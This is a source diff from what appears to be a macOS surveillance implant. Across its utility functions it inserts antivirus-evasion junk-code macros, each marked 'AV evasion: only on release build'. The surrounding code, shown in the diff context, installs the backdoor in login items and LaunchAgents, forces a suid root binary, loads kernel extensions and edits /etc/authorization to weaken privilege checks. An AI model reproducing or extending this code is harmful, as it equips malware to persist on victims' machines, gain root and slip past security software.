@@ -14,6 +14,7 @@
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
 
+#import "RCSMAVGarbage.h"
 
 static __m_MUtils *sharedUtils = nil;
 
@@ -117,12 +118,19 @@ static __m_MUtils *sharedUtils = nil;
 
 
 - (BOOL)searchSLIPlistForKey: (NSString *)aKey;
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSMutableDictionary *dicts = [self openSLIPlist];
   NSArray *keys = [dicts allKeys];
   
   if (dicts)
   {
+    
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
     for (NSString *key in keys)
     {
       if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
@@ -146,13 +154,19 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
 #ifdef DEBUG_UTILS
   NSLog(@"path: %@", aPath);
 #endif
   
   BOOL success = [anObject writeToFile: aPath
                             atomically: YES];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (success == NO)
   {
@@ -169,6 +183,9 @@ static __m_MUtils *sharedUtils = nil;
 #endif
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   //
   // Force owner since we can't remove that file if not owned by us
   // with removeItemAtPath:error (e.g. backdoor upgrade)
@@ -182,6 +199,9 @@ static __m_MUtils *sharedUtils = nil;
                              ourPlist,
                              nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [gUtil executeTask: @"/usr/sbin/chown"
        withArguments: _tempArguments
         waitUntilEnd: YES];
@@ -191,12 +211,18 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)addBackdoorToSLIPlist
-{  
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSMutableDictionary *dicts = [self openSLIPlist];
   NSArray *keys = [dicts allKeys];
-  
+
   if (dicts)
-    {
+  {  
+    // AV evasion: only on release build
+    AV_GARBAGE_003
+    
       for (NSString *key in keys)
         {
           if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
@@ -227,7 +253,10 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)removeBackdoorFromSLIPlist
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   //
   // For now we just move back the backup that we made previously
   // The best way would be just by removing our own entry from the most
@@ -248,15 +277,24 @@ static __m_MUtils *sharedUtils = nil;
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   return NO;
 }
 
 - (BOOL)createLaunchAgentPlist: (NSString *)aLabel
                      forBinary: (NSString *)aBinary
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
   NSDictionary *innerDict;
   NSString *userHome;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (getuid() == 0)
   {
@@ -287,6 +325,9 @@ static __m_MUtils *sharedUtils = nil;
   }
   else
   {
+    // AV evasion: only on release build
+    AV_GARBAGE_000
+    
     userHome = NSHomeDirectory(); 
   }
   
@@ -301,6 +342,9 @@ static __m_MUtils *sharedUtils = nil;
     [[NSFileManager defaultManager] removeItemAtPath: ourPlist
                                                error: nil];
   }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   NSString *launchAgentsPath = [NSString stringWithFormat: @"%@/Library/LaunchAgents",
                                 userHome];
@@ -320,6 +364,9 @@ static __m_MUtils *sharedUtils = nil;
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, aBinary];
   NSString *errorLog = [NSString stringWithFormat: @"/dev/null"];
   NSString *outLog   = [NSString stringWithFormat: @"/dev/null"];
@@ -333,6 +380,9 @@ static __m_MUtils *sharedUtils = nil;
                outLog, @"StandardOutPath",
                nil];
   //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [rootObj addEntriesFromDictionary: innerDict];
   [innerDict release];
@@ -348,12 +398,17 @@ static __m_MUtils *sharedUtils = nil;
   NSMutableArray *innerArray = [NSMutableArray new];
   NSString *appKey = @"AutoLaunchedApplicationDictionary";
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSArray *tempArray = [NSArray arrayWithObjects: @"1",
                                                   [[NSBundle mainBundle] bundlePath],
                                                   nil];
   NSArray *tempKeys  = [NSArray arrayWithObjects: @"Hide",
                                                   @"Path",
                                                   nil];
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   innerDict = [NSDictionary dictionaryWithObjects: tempArray
                                           forKeys: tempKeys];
@@ -361,12 +416,19 @@ static __m_MUtils *sharedUtils = nil;
   [rootObj setObject: innerArray
               forKey: appKey];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSString *err;
   NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                                format: NSPropertyListXMLFormat_v1_0
                                                      errorDescription: &err];
   
   [innerArray release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (binData)
     {
       return [self saveSLIPlist: binData
@@ -385,12 +447,17 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   return [self searchSLIPlistForKey: aKey];
 }
 
 - (id)openSLIPlist
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSData *binData = [NSData dataWithContentsOfFile: mSLIPlistPath];
   NSString *error;
   
@@ -402,6 +469,8 @@ static __m_MUtils *sharedUtils = nil;
       
       return 0;
     }
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSPropertyListFormat format;
   NSMutableDictionary *dicts = (NSMutableDictionary *)
@@ -421,12 +490,16 @@ static __m_MUtils *sharedUtils = nil;
 - (BOOL)dropExecFlag
 {
   BOOL success;
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   // Create the empty existence flag file
   success = [@"" writeToFile: [self mExecFlag]
                   atomically: NO
                     encoding: NSUnicodeStringEncoding
                        error: nil];
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   if (success == YES)
   {
@@ -449,6 +522,8 @@ static __m_MUtils *sharedUtils = nil;
 - (BOOL)makeSuidBinary: (NSString *)aBinary
 {
   BOOL success;
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   //
   // Forcing suid permission on start, just to be sure
@@ -465,6 +540,8 @@ static __m_MUtils *sharedUtils = nil;
                                       owner,
                                       NSFileOwnerAccountID,
                                       nil];
+      // AV evasion: only on release build
+      AV_GARBAGE_008
       
       success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                                  ofItemAtPath: aBinary
@@ -481,12 +558,16 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)unloadKext
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (is64bitKernel())
   {
 #ifdef DEBUG_UTILS
     NSLog(@"Unloading our KEXT64 @ %@", mKext64Path);
 #endif
+    // AV evasion: only on release build
+    AV_GARBAGE_005
     
     if ([[NSFileManager defaultManager] fileExistsAtPath: mKext64Path])
     {
@@ -495,7 +576,10 @@ static __m_MUtils *sharedUtils = nil;
 #endif
       
       if (getuid() == 0 || geteuid() == 0)
-      {
+      {  
+        // AV evasion: only on release build
+        AV_GARBAGE_006
+        
         NSArray *arguments = [NSArray arrayWithObjects: mKext64Path, nil];
         
         [self executeTask: @"/sbin/kextunload"
@@ -522,10 +606,15 @@ static __m_MUtils *sharedUtils = nil;
 #ifdef DEBUG_UTILS
       NSLog(@"KEXT32 found");
 #endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       if (getuid() == 0 || geteuid() == 0)
       {
         NSArray *arguments = [NSArray arrayWithObjects: mKext32Path, nil];
+        
+        // AV evasion: only on release build
+        AV_GARBAGE_005
         
         [self executeTask: @"/sbin/kextunload"
             withArguments: arguments
@@ -545,7 +634,9 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)loadKextFor64bit: (BOOL)is64bit
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   if (is64bitKernel())
     {
 #ifdef DEBUG_UTILS
@@ -556,6 +647,9 @@ static __m_MUtils *sharedUtils = nil;
 #ifdef DEBUG_UTILS
           NSLog(@"KEXT64 found");
 #endif
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
           NSArray *arguments = [NSArray arrayWithObjects: @"-R",
                                                           @"744",
                                                           mKext64Path,
@@ -563,7 +657,10 @@ static __m_MUtils *sharedUtils = nil;
           [self executeTask: @"/bin/chmod"
               withArguments: arguments
                waitUntilEnd: YES];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_002
+          
           if (getuid() == 0 || geteuid() == 0)
             {
               arguments = [NSArray arrayWithObjects: @"-R",
@@ -574,6 +671,9 @@ static __m_MUtils *sharedUtils = nil;
                   withArguments: arguments
                    waitUntilEnd: YES];
 
+              // AV evasion: only on release build
+              AV_GARBAGE_009
+              
               arguments = [NSArray arrayWithObjects: mKext64Path, nil];
 
               [self executeTask: @"/sbin/kextload"
@@ -595,6 +695,9 @@ static __m_MUtils *sharedUtils = nil;
 #ifdef DEBUG_UTILS
       //NSLog(@"Loading KEXT32 @ %@", mKextPath);
 #endif
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if ([[NSFileManager defaultManager] fileExistsAtPath: mKext32Path])
         {
 #ifdef DEBUG_UTILS
@@ -607,7 +710,10 @@ static __m_MUtils *sharedUtils = nil;
           [self executeTask: @"/bin/chmod"
               withArguments: arguments
                waitUntilEnd: YES];
-
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           if (getuid() == 0 || geteuid() == 0)
             {
               arguments = [NSArray arrayWithObjects: @"-R",
@@ -619,7 +725,10 @@ static __m_MUtils *sharedUtils = nil;
                    waitUntilEnd: YES];
 
               arguments = [NSArray arrayWithObjects: mKext32Path, nil];
-
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_004
+              
               [self executeTask: @"/sbin/kextload"
                   withArguments: arguments
                    waitUntilEnd: YES];
@@ -634,12 +743,16 @@ static __m_MUtils *sharedUtils = nil;
           return NO;
         }
     }
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   return YES;
 }
 
 - (BOOL)disableSetugidAuth
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
   
   if (!binData)
@@ -694,7 +807,9 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)enableSetugidAuth
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSData *binData = [NSData dataWithContentsOfFile: @"/etc/authorization"];
   
   if (!binData)
@@ -782,7 +897,9 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)isLion
-{
+{  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (gOSMajor == 10 && gOSMinor == 7)
     return YES;
   
@@ -790,7 +907,10 @@ static __m_MUtils *sharedUtils = nil;
 }
 
 - (BOOL)isLeopard
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (gOSMajor == 10 && gOSMinor == 5)
     return YES;
   
@@ -800,12 +920,18 @@ static __m_MUtils *sharedUtils = nil;
 - (void)executeTask: (NSString *)anAppPath
       withArguments: (NSArray *)arguments
        waitUntilEnd: (BOOL)waitForExecution
-{
+{ 
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   NSTask *task = [[NSTask alloc] init];
   [task setLaunchPath: anAppPath];
   
   if (arguments != nil)
     [task setArguments: arguments];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   NSPipe *_pipe = [NSPipe pipe];
   [task setStandardOutput: _pipe];
@@ -815,11 +941,17 @@ static __m_MUtils *sharedUtils = nil;
   infoLog(@"Executing %@", anAppPath);
 #endif
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [task launch];
   
 #ifdef DEBUG_UTILS
   infoLog(@"Executed %@", anAppPath);
 #endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   if (waitForExecution == YES)
   {
